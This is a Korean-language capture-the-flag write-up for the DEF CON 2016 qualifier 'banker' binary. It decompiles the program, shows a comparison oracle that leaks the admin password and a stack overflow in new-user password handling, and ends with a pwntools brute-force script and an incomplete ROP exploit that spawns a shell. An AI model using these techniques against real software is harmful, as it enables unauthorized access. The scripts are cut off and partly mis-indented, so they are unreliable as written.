---
title: "Pwnable) banker"
sidebar_position: 1
---
## **Information**

### **Description**

```
Don't invest in this bank at

<http://download.quals.shallweplayaga.me/15d6ba5840307520a36aabed33e00841/banker>

[banker\_15d6ba5840307520a36aabed33e00841.quals.shallweplayaga.me:9252](http://download.quals.shallweplayaga.me/15d6ba5840307520a36aabed33e00841/banker)
```
### **File**

* [banker](/attachments/1147173/1147172.bin)

### **Source Code**

* <https://github.com/legitbs/quals-2016/tree/master/banker>

## **Writeup**

### File information

```sh title="File information"
lazenca0x0@ubuntu:~/Documents/DEFCON2016/Pwnable/banker$ file banker
banker: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
lazenca0x0@ubuntu:~/Documents/DEFCON2016/Pwnable/banker$ checksec.sh --file banker
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   banker
lazenca0x0@ubuntu:~/Documents/DEFCON2016/Pwnable/banker$
```

* 해당 프로그램을 실행하면 다음과 같이 출력됩니다.
  + "/tmp/users.txt"파일이 존재하지 않는다고 출력합니다.

```sh title="Output"
lazeca0x0@ubuntu:~/Documents/DEFCON2016/Pwnable/banker$ ./banker 
LegitBS Bank Terminal, Routing Number 766683678470
Current UTC time is: Tue Sep 13 01:17:11 2016

Unable to open users file: /tmp/users.txt
```

* 해당 문제를 해결하기 위해 "/tmp/"에 "users.txt" 파일을 생성합니다.

```sh title="File edit"
lazeca0x0@ubuntu:~/Documents/DEFCON2016/Pwnable/banker$ vi /tmp/users.txt
```

### **Binary analysis**

#### **Main**

* 해당 함수는 다음과 같은 기능을 합니다.
  + LoadUserInfo() 함수를 이용해 User의 정보를 메모리에 저장합니다.
  + UserInput() 함수를 이용해 사용자로 부터 Username, Password를 입력 받습니다.
  + CheckUsername() 함수를 이용해 사용자가 입력한 Username이 존재하는지 확인합니다.
  + CheckPassword() 함수를 이용해 올바른 Password 인지 확인합니다.
  + Login에 성공하면 Commands() 함수를 호출합니다.

```c title="main"
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  struct tm *structTime; // ebx@1
  int isUserInfo; // ebx@2
  char isPasswd; // [esp+0h] [ebp-1050h]@6
  int count; // [esp+4h] [ebp-104Ch]@1
  time_t timer; // [esp+8h] [ebp-1048h]@1
  char username[8]; // [esp+Ch] [ebp-1044h]@2
  char password[8]; // [esp+14h] [ebp-103Ch]@2
  char v10; // [esp+1Ch] [ebp-1034h]@1
  char tmp[4096]; // [esp+28h] [ebp-1028h]@2
  int v12; // [esp+1028h] [ebp-28h]@2
  char v13; // [esp+102Ch] [ebp-24h]@2
  int tmpUserName[4]; // [esp+1030h] [ebp-20h]@2
  int *v15; // [esp+1040h] [ebp-10h]@1
  int v16; // [esp+1048h] [ebp-8h]@4
  int strTimeInfo; // [esp+104Ch] [ebp-4h]@1

  v15 = &argc;
  sub_804A090(&v10);
  setbuf(stream, 0);
  __bsd_signal(14, AlarmHandler);
  alarm(35u);
  time(&timer);
  structTime = localtime(&timer);
  _IO_puts("LegitBS Bank Terminal, Routing Number 766683678470");
  strTimeInfo = asctime(structTime);
  printf(1, "Current UTC time is: %s\n", strTimeInfo);
  count = 0;
  while ( 1 )
  {
    LoadUserInfo((int)&v10);
    printf(1, "Enter username: ");
    v12 = 0;
    v13 = 0;
    UserInput(username, (_DWORD *)tmp, 13u);
    printf(1, "Enter password: ");
    UserInput(password, (_DWORD *)tmp, 9u);
    memcpy(tmpUserName, (int)username);
    isUserInfo = CheckUsername((int)&v10, (int)tmpUserName);
    tmpDelete(tmpUserName);
    if ( !isUserInfo )
      break;
    isPasswd = CheckPassword((char **)(isUserInfo + 20), (char **)password);
    if ( isPasswd )
    {
      if ( (unsigned int)++count > 7 )
      {
        _IO_puts("Login being delayed due to too many failed attempts!");
        sleep(1u, v16);
        count = 0;
      }
      strTimeInfo = isPasswd;
      printf(1, "Invalid username/password, error code=%d\n", isPasswd);
LABEL_11:
      tmpDelete((int *)password);
      tmpDelete((int *)username);
    }
    else
    {
      strTimeInfo = dirfd((DIR *)(isUserInfo + 12));
      printf(1, "Successfully logged in as: %s\n", strTimeInfo);
      Commands((_DWORD *)tmp, isUserInfo, (int)&v10);
      tmpDelete((int *)password);
      tmpDelete((int *)username);
    }
  }
  if ( (unsigned int)++count > 7 )
  {
    _IO_puts("Login being delayed due to too many failed attempts!");
    sleep(1u, v16);
    count = 0;
  }
  strTimeInfo = 0;
  printf(1, "Invalid username/password, error code=%d\n", 0);
  goto LABEL_11;
}
```

#### LoadUserInfo

* 해당 함수는 다음과 같은 기능을 합니다.
  + fopen()함수를 이용해 "/tmp/users.txt" 파일의 내용을 메모리에 저장합니다.
  + feof()함수를 이용해 파일의 끝인지 확인합니다.
    - Parsing()함수는 "/tmp/users.txt" 파일 내용에서 Username,Password,Permission 정보를 인자값에 저장합니다.
    - AddUser()함수를 이용해 User 정보를 등록합니다.
      * "/tmp/users.txt" 파일에서 확인한 Username, Password, Permission 정보를 이용합니다.
    - 이러한 과정을 파일의 끝을 만날때 까지 반복합니다.

```c title="LoadUserInfo"
char __cdecl LoadUserInfo(int a1)
{
  FILE *ptrFile; // ebx@1
  char result; // al@5
  char permission; // di@6
  int tmpPermission; // [esp+14h] [ebp-48h]@5
  char tmpPassword[9]; // [esp+1Ah] [ebp-42h]@5
  char tmpUserName[13]; // [esp+23h] [ebp-39h]@5
  char password[8]; // [esp+30h] [ebp-2Ch]@6
  char userName[9]; // [esp+38h] [ebp-24h]@6

  ptrFile = (FILE *)_IO_new_fopen((int)"/tmp/users.txt", (int)&unk_80DFE03);
  if ( !ptrFile )
  {
    printf(1, "Unable to open users file: %s\n", "/tmp/users.txt");
    exit(-1);
  }
  sub_804AA3A(a1);
  while ( !_IO_feof(ptrFile) )
  {
    result = Parsing(ptrFile, tmpUserName, tmpPassword, &tmpPermission);
    if ( !result )
      return result;
    permission = tmpPermission;
    StringCopy(password, tmpPassword);
    StringCopy(userName, tmpUserName);
    AddUser(a1, (unsigned int)userName, (unsigned int)password, permission);
    tmpDelete((int *)userName);
    tmpDelete((int *)password);
  }
  return _IO_new_fclose(ptrFile);
}
```

#### Parsing()

* 해당 함수는 다음과 같은 기능을 합니다.
  + fget()함수를 이용해 "/tmp/users.txt"으로 부터 파일의 내용을 읽어서 oneline에 저장합니다.
  + 아래 코드에서 수정이 필요한 내용이 있습니다.
  - "strChar = \*((\_BYTE \*)&len + lineArrayCount + 3);"는 "strChar = oneline[lineArrayCount-1]" 입니다.
  - lineArrayCount의 값이 1 이기 때문에 4(1+3)byte떨어져 있는 oneline[0]영역이라는 것을 알 수 있습니다.+ 문자열에서 ' '(공백)을 이용해 단어를 구분해 저장합니다.  
    - 첫번째 단어는 Username
    - 두번째 단어는 Password
    - 세번째 단어는 Permission
  + 그리고 Password는 base64Decode() 함수를 이용해 값을 복호화(Decode)합니다.
    - 즉, Password는 base64로 Encoding되어 있다는 것을 알수 있습니다.

```c title="Parsing"
bool __cdecl Parsing(_IO_FILE *ptrFile, char *userName, char *password, int *permission)
{
  bool result; // al@1
  unsigned int lineLen; // ecx@3 MAPDST
  unsigned int lineArrayCount; // eax@4
  unsigned int count; // esi@4 MAPDST
  unsigned int wordIndex; // edx@4
  char strChar; // cl@8
  int *ptrDecodedPassword; // ebx@29
  size_t len; // [esp+1Ch] [ebp-C20h]@8 MAPDST
  char oneline[1024]; // [esp+20h] [ebp-C1Ch]@2
  char tmpPassword[1024]; // [esp+420h] [ebp-81Ch]@14
  char tmpPermission[1052]; // [esp+820h] [ebp-41Ch]@15

  result = 0;
  if ( !ptrFile )
    return result;
  if ( !_IO_fgets(oneline, 1024, &ptrFile->_flags) )
    return 0;
  lineLen = strlen(oneline) + 1;
  if ( --lineLen == 1 )
    return 0;
  lineArrayCount = 1;
  count = 0;
  wordIndex = 0;
  while ( 1 )
  {
    strChar = *((_BYTE *)&len + lineArrayCount + 3);
    if ( strChar == ' ' )
    {
      if ( wordIndex == 1 )
      {
        tmpPassword[count] = 0;
      }
      else if ( wordIndex < 1 )
      {
        userName[count] = 0;
      }
      else if ( wordIndex == 2 )
      {
        tmpPermission[count] = 0;
      }
      ++wordIndex;
      count = 0;
LABEL_27:
      if ( lineLen <= lineArrayCount )
        goto LABEL_28;
      if ( wordIndex == 3 )
        goto LABEL_29;
      goto LABEL_7;
    }
    if ( strChar == '\n' )
      break;
    if ( wordIndex == 1 )
    {
      tmpPassword[++count] = strChar;
    }
    else if ( wordIndex < 1 )
    {
      if ( count > 0xC )
        return 0;
      userName[++count] = strChar;
    }
    else
    {
      if ( wordIndex != 2 )
        goto LABEL_27;
      tmpPermission[++count] = strChar;
    }
    if ( lineLen <= lineArrayCount )
      goto LABEL_28;
LABEL_7:
    ++lineArrayCount;
  }
  ++wordIndex;
LABEL_28:
  if ( wordIndex != 3 )
    return 0;
LABEL_29:
  tmpPermission[count] = 0;
  *permission = atoi((int)tmpPermission, 0, 10);
  ptrDecodedPassword = (int *)base64Decode(tmpPassword, strlen(tmpPassword), &len);
  memcpy(password, ptrDecodedPassword, len);
  password[len] = 0;
  sub_804B3C9((int)ptrDecodedPassword);
  return len <= 8;
}
```

* Parsing() 함수의 코드 분석을 통해 "/tmp/users.txt"파일 내용의 형태를 다음과 같이 추측할 수 있습니다.

```text title="users.txt example"
[Username] [Base64Encode(Password)] [Permission]
```

```text title="example"
Admin dGVzdA0K 1
```

#### CheckUsername

* 해당 함수는 다음과 같은 기능을 합니다.  
  + sub\_804AEF2() 함수를 이용해 User정보를 전달하고 있습니다.
  + sub\_804AEF2() 함수는 CheckPassword() 함수에 User정보를 전달하고 있습니다.
  + 즉, CheckUsername()함수는 CheckPassword()함수를 이용해 User정보를 확인하고 있습니다.

```c title="CheckUsername"
int *__cdecl CheckUsername(int a1, int name)
{
  int *v2; // ebx@1

  v2 = *(int **)(a1 + 4);
  if ( !v2 )
    return 0;
  while ( !sub_804AEF2((int)(v2 + 3), name) )
  {
    v2 = (int *)sub_804A842(a1, v2);
    if ( !v2 )
      return 0;
  }
  return v2;
}
```

```c title="sub_804AEF2"
bool __cdecl sub_804AEF2(int a1, int a2)
{
  return CheckPassword((char **)a1, (char **)a2) == 0;
}
```

#### CheckPassword

* 해당 함수는 다음과 같은 기능을 합니다.
  + 해당 함수를 분석하기 전에 알아야 할 내용이 있습니다.
    - \*\*info에는 "/tmp/users.txt" 파일에서 읽은 Username, Password 정보가 전달됩니다.
  + 해당 함수는 파일에서 읽은 단어가 사용자가 입력한 단어의 길이보다 작은지 확인합니다.
    - 만약 그렇다면 -1을 return 하며, 그렇지 않을 경우 1을 result에 저장합니다.
  + 다음과 같이 파일에서 읽은 단어와 사용자가 입력한 단어를 비교합니다.

**if()**

| 조건 | return되는 값 |
| --- | --- |
| 파일에서 읽은 단어의 문자 값 &lt; 사용자가 입력한 단어의 문자 | -1 |
| 파일에서 읽은 단어의 문자 값 > 사용자가 입력한 단어의 문자 | 1 |

* + 그리고 다음과 같은 경우에 0을 return합니다.
    - 파일에서 읽은 단어의 길이가 0 일 경우
    - 파일에서 읽은 단어와 사용자가 입력한 단어가 같을 경우

```c title="CheckPassword"
signed int __cdecl CheckPassword(char **info, char **target)
{
  char *infoLen; // ebx@1
  char *targetLen; // edx@1
  signed int result; // eax@2
  char chInfo; // dl@4 MAPDST
  char chTarget; // al@4 MAPDST
  int count; // eax@6

  infoLen = info[1];
  targetLen = target[1];
  if ( infoLen < targetLen )
    return -1;
  result = 1;
  if ( infoLen > targetLen )
    return result;
  if ( infoLen )
  {
    chInfo = **info;
    chTarget = **target;
    if ( chInfo < chTarget )
    {
      result = -1;
    }
    else if ( chInfo > chTarget )
    {
      result = 1;
    }
    else
    {
      count = 0;
      do
      {
        if ( (char *)++count == infoLen )
          return 0;
        chInfo = (*info)[count];
        chTarget = (*target)[count];
        if ( chInfo < chTarget )
          return -1;
      }
      while ( chInfo <= chTarget );
      result = 1;
    }
  }
  else
  {
    result = 0;
  }
  return result;
}
```

* 다음과 같은 방법으로 Password를 찾을 수 있습니다.
  + 해당 함수는 첫번째로 두 단어의 길이를 비교하고 있습니다.  
    - 사용자가 입력한 단어의 길이가 파일에서 읽은 단어의 길이보다 클 경우 -1 을 리턴합니다.
    - 이러한 조건을 이용해 다음과 같이 Password의 길이를 알수 있습니다.
      * 예제에서 확인한 Password의 길이는 4입니다.

```sh title="Password length check"
lazeca0x0@ubuntu:~/Documents/DEFCON2016/Pwnable/banker$ ./banker
LegitBS Bank Terminal, Routing Number 766683678470
Current UTC time is: Thu Apr 20 23:00:53 2017

Enter username: admin
Enter password: 1
Invalid username/password, error code=1
Enter username: admin
Enter password: 12
Invalid username/password, error code=1
Enter username: admin
Enter password: 123
Invalid username/password, error code=1
Enter username: admin
Enter password: 1234
Invalid username/password, error code=1
Enter username: admin
Enter password: 12345
Invalid username/password, error code=-1
Enter username:
```

* + 두번째로 두 단어의 문자를 차례데로 비교합니다.
    - 이 또한 사용자가 입력한 단어의 문자가 클경우 -1 을 리턴합니다.
    - 이러한 조건을 이용해 다음과 같이 Password에 사용된 문자를 찾을 수 있습니다.
      * 예제에서 확인한 Password의 첫번째 문자는 t 입니다.
  + 이러한 방식을 이용해 Admin의 Password를 찾을 수 있습니다.
* "Exploit code" 페이지에 관련 Script가 있습니다.

```sh title="Password characters check"
lazeca0x0@ubuntu:~/Documents/DEFCON2016/Pwnable/banker$ ./banker
LegitBS Bank Terminal, Routing Number 766683678470
Current UTC time is: Thu Apr 20 23:12:33 2017

Enter username: admin
Enter password: s123
Invalid username/password, error code=1
Enter username: admin
Enter password: t123
Invalid username/password, error code=1
Enter username: admin
Enter password: u123
Invalid username/password, error code=-1
Enter username:
```

#### **Commands()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + 해당 프로그램에서 제공하는 기능 목록을 출력합니다.
  + 사용자로 부터 실행하고자 하는 기능의 번호를 입력받아 기능을 실행합니다.
  + 6번 "Admin Console" 기능은 Permission이 1 일 경우에만 사용가능합니다.

```c title="Commands"
int __usercall Commands@<eax>(long double fst7_0@<st0>, _DWORD *a1, int userInfo, int a3)
{
  char exit; // si@5
  char commiting; // [esp+Fh] [ebp-39h]@1
  char command[8]; // [esp+1Ch] [ebp-2Ch]@4
  char v8; // [esp+24h] [ebp-24h]@1

  sub_804B02E((int)&v8);
  commiting = 0;
  do
  {
    _IO_puts(135053566);
    _IO_puts("1) New Transfer");
    _IO_puts("2) View Pending Transfers");
    _IO_puts("3) Delete Transfer");
    _IO_puts("4) Logout and Commit Transfers");
    _IO_puts("5) Logout and DO NOT commit Transfers");
    if ( *(_BYTE *)(userInfo + 28) == 1 )
      _IO_puts("6) Admin Console");
    UserInput(command, a1, 2u);
    switch ( atoi_0((int *)command) )
    {
      case 1u:
        NewTransfer(fst7_0, a1, (int)&v8, userInfo);
        exit = 0;
        break;
      case 2u:
        ViewPendingTransfers(a1, &v8);
        exit = 0;
        break;
      case 3u:
        DeleteTransfer(a1, &v8);
        exit = 0;
        break;
      case 4u:
        _IO_puts("Logging out and commiting.");
        exit = 1;
        commiting = 1;
        break;
      case 5u:
        _IO_puts("Logging out and not commiting");
        exit = 1;
        commiting = 0;
        break;
      case 6u:
        if ( *(_BYTE *)(userInfo + 28) == 1 )
        {
          AdminConsole(a1, a3, userInfo);
          exit = 0;
        }
        else
        {
          _IO_puts("Invalid selection.");
          exit = 0;
        }
        break;
      default:
        _IO_puts("Invalid selection.");
        exit = 0;
        break;
    }
    tmpDelete((int *)command);
  }
  while ( !exit );
  if ( commiting )
    sub_804B056(&v8);
  return sub_804B042(&v8);
}
```

#### **AdminConsole()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + 사용가능한 기능 목록을 출력합니다.
  + 사용자로 부터 실행하고자 하는 기능의 번호를 입력받아 기능을 실행합니다.

```c title="AdminConsole"
int __cdecl AdminConsole(_DWORD *a1, int a2, int a3)
{
  signed int command; // eax@3
  char exit; // si@8
  int tmp[8]; // [esp+18h] [ebp-20h]@3

  if ( *(_BYTE *)(a3 + 28) != 1 )
    return _IO_puts("Not an admin!");
  do
  {
    _IO_puts("Admin Commands:");
    _IO_puts("1) Create New User");
    _IO_puts("2) View Users");
    _IO_puts("3) Delete User");
    _IO_puts("4) Exit");
    UserInput((char *)tmp, a1, 2u);
    command = atoi_0(tmp);
    if ( command == 2 )
    {
      ViewUsers(a1, a2);
      exit = 0;
      goto LABEL_14;
    }
    if ( command > 2 )
    {
      if ( command == 3 )
      {
        DeleteUser(a1, a2);
        exit = 0;
        goto LABEL_14;
      }
      exit = 1;
      if ( command == 4 )
        goto LABEL_14;
    }
    else if ( command == 1 )
    {
      CreateNewUser(a1, a2);
      exit = 0;
      goto LABEL_14;
    }
    _IO_puts("Invalid selection.");
    exit = 0;
LABEL_14:
    tmpDelete(tmp);
  }
  while ( !exit );
  return _IO_puts("Exiting.");
}
```

#### **CreateNewUser()**

* 해당 함수는 다음과 같은 기능을 합니다.
  + 사용자로 부터 새로 생성할 계정(Accout)의 UserName을 입력 받습니다.
  + 입력받은 UserName이 이미 등록되어 있는지 확인합니다.
    - 입력받은 UserName이 등록되지 않았을 경우 계정 생성을 계속 진행합니다.
  + 그리고 사용자로 부터 새로 생성한 계정에서 사용할 Password를  입력 받습니다.
  + 입력 받은 UserName, Password를 AddUser()함수를 이용해 "/tmp/users.txt"파일에 등록합니다.

```c title="CreateNewUser"
int (__cdecl *__cdecl CreateNewUser(_DWORD *arg0, int a1))(_DWORD, _DWORD)
{
  unsigned int v2; // ebx@2
  int v3; // edi@4
  int v4; // eax@5
  int *userInfo; // ebx@8
  int v6; // eax@9
  unsigned int i; // ebx@11
  int v8; // esi@13
  int v9; // eax@14
  int v10; // eax@17
  char tmpUsername[8]; // [esp+18h] [ebp-50h]@1
  char tmpPassword[8]; // [esp+20h] [ebp-48h]@1
  char username[8]; // [esp+28h] [ebp-40h]@2
  char checkUsername[8]; // [esp+30h] [ebp-38h]@8
  char password[8]; // [esp+38h] [ebp-30h]@10
  char newPassword[8]; // [esp+40h] [ebp-28h]@17
  int newUsername[8]; // [esp+48h] [ebp-20h]@17

  sub_804AAC6(tmpUsername);
  sub_804AAC6(tmpPassword);
  while ( 1 )
  {
LABEL_2:
    while ( 1 )
    {
      printf(1, "Enter New Username: ");
      UserInput(username, arg0, 256u);
      copy((int *)tmpUsername, (int)username);
      tmpDelete((int *)username);
      v2 = 0;
      if ( strlen(tmpUsername) <= 12u )
        break;
      printf(1, "Invalid username, must be %d characters or less.\n", 12);
    }
    while ( v2 < strlen(tmpUsername) )
    {
      v3 = dirfd((DIR *)tmpUsername);
      if ( !((*__ctype_b_loc())[*(char *)(v3 + v2)] & 8) )
      {
        v4 = dirfd((DIR *)tmpUsername);
        printf(1, "Invalid character %c in username, only alphanumeric is accepted.\n", *(char *)(v4 + v2));
        goto LABEL_2;
      }
      ++v2;
    }
    memcpy((_DWORD *)checkUsername, (int)tmpUsername);
    userInfo = CheckUsername(a1, (int)checkUsername);
    tmpDelete((int *)checkUsername);
    if ( !userInfo )
      break;
    v6 = dirfd((DIR *)tmpUsername);
    printf(1, "Invalid username, %s already exists.\n", v6);
  }
  while ( 1 )
  {
    printf(1, "Enter New Password: ");
    UserInput(password, arg0, 256u);
    copy((int *)tmpPassword, (int)password);
    tmpDelete((int *)password);
    if ( strlen(tmpPassword) > 5u )
      break;
    printf(1, "Invalid password, must be a minimum of %d characters.\n", 6);
  }
  for ( i = 0; i < strlen(tmpPassword); ++i )
  {
    v8 = dirfd((DIR *)tmpPassword);
    if ( !((*__ctype_b_loc())[*(char *)(v8 + i)] & 8) )
    {
      v9 = dirfd((DIR *)tmpPassword);
      printf(1, "Invalid character %c in password, only alphanumeric is accepted.\n", *(char *)(v9 + i));
      break;
    }
  }
  v10 = dirfd((DIR *)tmpUsername);
  printf(1, "User %s added.\n", v10);
  memcpy((_DWORD *)newPassword, (int)tmpPassword);
  memcpy(newUsername, (int)tmpUsername);
  AddUser(a1, (unsigned int)newUsername, (unsigned int)newPassword, 0);
  tmpDelete(newUsername);
  tmpDelete((int *)newPassword);
  tmpDelete((int *)tmpPassword);
  return tmpDelete((int *)tmpUsername);
}
```

### 취약성 확인

* 해당 프로그램의 취약성은 CreateNewUser() 함수에서 Password를 입력 받는 부분에서 발생합니다.
  + UserInput()함수를 이용해 사용자로부터 입력받을 수 있는 문자열의 최대 길이는 256입니다.
  + 하지만 copy()함수에 의해 복사대상이 되는 tmpPassword의 크기는 8 byte입니다.
  + 그리고 해당 프로그램은 Password의 최소 길이 값(5) 만 확인하고 있습니다.

```c title="Password length check"
char tmpPassword[8]

...

	printf(1, "Enter New Password: ");
	UserInput(password, arg0, 256u);
	copy((int *)tmpPassword, (int)password);
	tmpDelete((int *)password);
	if ( strlen(tmpPassword) > 5u )
		break;
```

* Username을 입력받은 부분은 사용가능한 최대 길이 값을 확인하고 있기 때문에 Overflow가 발생할 수 없습니다.

```c title="Username length check"
char tmpUsername[8];

...

 	printf(1, "Enter New Username: ");
	UserInput(username, arg0, 256u);
	copy((int *)tmpUsername, (int)username);
	tmpDelete((int *)username);
	v2 = 0;
	if ( strlen(tmpUsername) <= 12u )
		break;
```

### Structure of Exploit code

:::note[Description]
1. Admin의 Password를 추출
   1. bruteforce 방법을 이용하여 Admin계정의 Password를 추출합니다.
2. Admin계정을 이용하여 새로운 계정을 생성시 Password에 Payload 입력
   1. Password에 ROP를 입력합니다.
3. Logout
:::

* The following information is required for an attack:

:::note[Check point]
* Admin계정의 Password
* Shell을 획득하기 위한 ROP
:::

### **Information for attack**

#### **Admin계정의 Password추출**

* "Exploit Code" 에 "findPassword.py" 파일 참조

#### **Shell을 획득하기 위한 ROP - (ROP설계)**

* INT 80  명령어를 이용하여 execve()함수를 실행합니다.
  + UserInput(0x0804a6b0) 함수를 이용하여 사용자로 부터 "    /bin/sh" 를 입력받아, 해당 값을 dest, src에 값을 저장합니다.
  + INT 80코드를 이용하여 execve()함수를 실행하기 위해 strlen(0x0804abae)함수를 이용하여 EAX에 execve() 함수의 System call 번호를 저장합니다.
    - "/bin/sh" 앞에 공백 4개를 입력하는 이유는 EAX에 11이라는 값을 저장하기 위해서 입니다.

```text title="ROP Chaining"
0x0804a6b0(dest,src,len)
0x0804abae(dest)
sys_execve(src,0,0)
```

#### **Shell을 획득하기 위한 ROP - (사용자 입력값을 저장할 메모리 공간)**

* 다음은 readelf를 이용하여 해당 문제 파일의 Secation Headers를 확인할 결과 입니다.
  + "    /bin/sh"문자열을 저장할 영역으로 .bbs 영역의 끝 부분을 사용하겠습니다.
    - 0x080fd060 ~ 0x8102f38 영역

```sh title=".bbs" 
lazeca0x0@ubuntu:~/Documents/DEFCON 2016$ readelf -S banker
There are 27 section headers, starting at offset 0xb5174:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.ABI-tag     NOTE            080480f4 0000f4 000020 00   A  0   0  4
  [ 2] .rel.plt          REL             08048138 000138 000070 08   A  0   4  4
  [ 3] .init             PROGBITS        080481a8 0001a8 000023 00  AX  0   0  4
  [ 4] .plt              PROGBITS        080481d0 0001d0 0000e0 00  AX  0   0 16
  [ 5] .text             PROGBITS        080482b0 0002b0 083109 00  AX  0   0 16
  [ 6] __libc_freeres_fn PROGBITS        080cb3c0 0833c0 000ac6 00  AX  0   0 16
  [ 7] __libc_thread_fre PROGBITS        080cbe90 083e90 00006f 00  AX  0   0 16
  [ 8] .fini             PROGBITS        080cbf00 083f00 000014 00  AX  0   0  4
  [ 9] .rodata           PROGBITS        080cbf20 083f20 01da40 00   A  0   0 32
  [10] __libc_subfreeres PROGBITS        080e9960 0a1960 00002c 00   A  0   0  4
  [11] __libc_atexit     PROGBITS        080e998c 0a198c 000004 00   A  0   0  4
  [12] __libc_thread_sub PROGBITS        080e9990 0a1990 000004 00   A  0   0  4
  [13] .eh_frame         PROGBITS        080e9994 0a1994 010bc4 00   A  0   0  4
  [14] .gcc_except_table PROGBITS        080fa558 0b2558 0004aa 00   A  0   0  4
  [15] .tdata            PROGBITS        080fb68c 0b368c 000010 00 WAT  0   0  4
  [16] .tbss             NOBITS          080fb69c 0b369c 000020 00 WAT  0   0  4
  [17] .init_array       INIT_ARRAY      080fb69c 0b369c 00000c 00  WA  0   0  4
  [18] .fini_array       FINI_ARRAY      080fb6a8 0b36a8 000008 00  WA  0   0  4
  [19] .jcr              PROGBITS        080fb6b0 0b36b0 000004 00  WA  0   0  4
  [20] .data.rel.ro      PROGBITS        080fb6c0 0b36c0 000930 00  WA  0   0 32
  [21] .got              PROGBITS        080fbff0 0b3ff0 000008 04  WA  0   0  4
  [22] .got.plt          PROGBITS        080fc000 0b4000 000044 04  WA  0   0  4
  [23] .data             PROGBITS        080fc060 0b4060 000ff4 00  WA  0   0 32
  [24] .bss              NOBITS          080fd060 0b5054 005ed8 00  WA  0   0 32
  [25] __libc_freeres_pt NOBITS          08102f38 0b5054 000018 00  WA  0   0  4
  [26] .shstrtab         STRTAB          00000000 0b5054 000120 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
```

#### **Shell을 획득하기 위한 ROP - (****ROP Gadget)**

* INT 80 명령어를 실행하여면 POP edx, POP ecx, POP ebx 명령어가 필요합니다.
* 필요한 gadget은 다음과 같은 방법을 이용하여 찾을 수 있으며, 사용될 주소는 0x08083650 입니다.

```sh title="./rp-lin-x86 -r 3 -f ./banker |grep \"pop edx ; pop ecx ; pop ebx\""
lazeca0x0@ubuntu:~/Documents/DEFCON 2016/$ ./rp-lin-x86 -r 3 -f ./banker |grep "pop ebx ; pop ecx ; pop edx"
lazeca0x0@ubuntu:~/Documents/DEFCON 2016$ ./rp-lin-x86 -r 3 -f ./banker |grep "pop edx ; pop ecx ; pop ebx"

0x08083650: pop edx ; pop ecx ; pop ebx ; ret  ;  (1 found)
```

* 다음으로 System call 호출을 위한 "int 0x80" 명령어가 필요합니다.
  + 사용될 주소는 0x080566a3 입니다.

```sh title="./rp-lin-x86 -r 0 -f ./banker |grep \"int 0x80\""
lazeca0x0@ubuntu:~/Documents/DEFCON 2016$ ./rp-lin-x86 -r 0 -f ./banker |grep "int 0x80"
0x080566a3: int 0x80 ;  (1 found)
0x080568c9: int 0x80 ;  (1 found)
0x08057569: int 0x80 ;  (1 found)
0x0805a341: int 0x80 ;  (1 found)
0x0805ed35: int 0x80 ;  (1 found)
0x0805ed3e: int 0x80 ;  (1 found)
0x080811e3: int 0x80 ;  (1 found)
0x0808370e: int 0x80 ;  (1 found)
0x08084040: int 0x80 ;  (1 found)
0x080acb29: int 0x80 ;  (1 found)
0x080ae4eb: int 0x80 ;  (1 found)
0x080e7803: int 0x80 ;  (1 found)
```

#### **확인 내용 정리**

:::note[공격에 사용될 정보]
* Admin계정의 Password : findPassword.py 파일 참조
* Shell을 획득하기 위한 ROP
  + "pop edx, pop ecx, pop ebx, ret" : 0x08083650
  + "int 0x80" : 0x080566a3
* 사용자 입력값을 저장할 메모리 공간
  + dest : 0x8102010
  + src : 0x8101110
:::

## **Exploit Code**

```python title="findPassword.py"
from itertools import product
from pwn import *
 
username = 'admin'
 
chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'        # Chars Dictionary
  
p = process("./banker")
 
def lengthCheck():
    lenght = 1
    for i in xrange(1,8):
        p.recvuntil('Enter username: ')
        p.sendline('admin')
        p.recvuntil('Enter password: ')
        p.sendline('A'*lenght)
  
        re = p.recvuntil('\n')
    if re.find('delayed') > -1:
        re = p.recvuntil('\n')
        if re.find('Invalid') > -1:
                err = int(re[re.find("code=") + 5:])
                if err == -1:
                        lenght -= 1
                        break
                else:
                    lenght += 1
    return lenght
  
def pwdCheck(pwdlength):
    pwdArr = []
 
    for length in range(pwdlength):
        pwdArr.append(0)
 
    for length in range(0,pwdlength):
        for count in range(1,len(chars)):
                pwdArr[length] = chars[count]
                pwd = "".join(str(tmp) for tmp in pwdArr)
  
                p.recvuntil('Enter username: ')
                p.sendline('admin')
                p.recvuntil('Enter password: ')
                p.sendline(pwd)
         
                re = p.recvuntil('\n')
        if re.find('delayed') > -1:
            re = p.recvuntil('\n')               
        if re.find('Invalid') > -1:
                        err = int(re[re.find("code=") + 5:])
                        if err == -1:
                                pwdArr[length] = chars[count -1]
                                print "Find! : " + pwdArr[length]
                                break
            elif err == 1:
                            count += 1
                elif re.find('Successfully') > -1:
                        print "Find! : " + pwdArr[length]
                        break
 
    return pwd
 
maxlenght = lengthCheck()
print 'Password lenght Find ! : ' + str(maxlenght)
 
password = pwdCheck(maxlenght)
print 'Password char Find! : ' + str(password)
print p.recv()
p.interactive()
```

```python title="banker Exploit"
from pwn import *
from struct import *

p = process('./banker')
  
def login():
    p.recvuntil('Enter username: ')
    p.sendline('test')
    p.recvuntil('Enter password: ')
    p.sendline('test')
  
def useradd(pay):
    p.sendlineafter('6) Admin Console','6')
    p.sendlineafter('4) Exit','1')
    p.sendlineafter('Enter New Username:','1')
    p.sendlineafter('Enter New Password:',pay)
    p.sendlineafter('4) Exit','4')
    p.sendlineafter('6) Admin Console','5')
 
pay = cyclic(0x42 - 4)
pay += p32(0x08101010) #ebx
pay += p32(0x0804a6b0)  #UserInput
pay += p32(0x08048dd5)  #leave;ret;
pay += p32(0x08102f50)  #dest
pay += p32(0x08101010)  #tmp
pay += p32(0x00001000)  #length
  
login()
useradd(pay)
 
buf = 0x08101010+0x30
